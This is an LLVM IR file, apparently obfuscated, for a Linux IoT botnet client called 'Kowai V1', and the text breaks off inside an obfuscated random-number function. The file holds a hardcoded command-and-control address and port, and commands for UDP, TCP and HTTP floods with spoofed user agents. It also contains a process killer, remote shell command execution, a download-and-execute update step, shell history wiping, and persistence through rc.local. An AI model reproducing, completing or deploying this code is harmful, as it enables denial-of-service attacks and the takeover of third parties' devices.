; ModuleID = 'host/ir_fla/Kowai.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.state_t = type { i32, i8 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.__dirstream = type opaque
%struct.killerinfo = type { i8* }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@cncip = global i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [16 x i8] c"178.128.154.119\00", align 1
@cncport = global i32 1994, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.32, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.3 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.4 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.6 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.7 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.10 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.11 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.12 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.17 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.18 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.19 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.21 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.22 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.23 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.24 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.25 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.27 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.28 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.29 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.30 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.32 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@hacked = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pgid = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.147 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.33 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.36 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.37 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.39 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.41 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.43 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.44 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.49 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.51 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.53 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.54 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.55 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.57 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.60 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.62 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.63 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.73 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.74 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.77 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.80 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.82 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.83 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.84 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.93 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.94 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.98 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.99 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"8UsA.sh\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.102 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"Successfully downloaded file\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"slumpthegod\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"./\00", align 1
@.str.107 = private unnamed_addr constant [11 x i8] c" Kowai.old\00", align 1
@.str.108 = private unnamed_addr constant [20 x i8] c"EXECUTED NEW BINARY\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"KILLER\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.113 = private unnamed_addr constant [15 x i8] c"KILLER STOPPED\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.115 = private unnamed_addr constant [15 x i8] c"KILLER STARTED\00", align 1
@.str.116 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.118 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.122 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"STOPATTK\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.131 = private unnamed_addr constant [33 x i8] c"kowai ohhhh that sad kid slump??\00", align 1
@.str.132 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.135 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.137 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.140 = private unnamed_addr constant [52 x i8] c"\1B[1;35mJoining\1B[1;32m > \1B[90m[\1B[1;33m%s\1B[90m]  \1B[0m\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"kowai V1\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.143 = private unnamed_addr constant [4 x i8] c"CMD\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.145 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 2058630981, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2058630981, label %10
    i32 -528678595, label %14
    i32 -571831942, label %32
    i32 -1823639389, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -528678595, i32 -1823639389
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
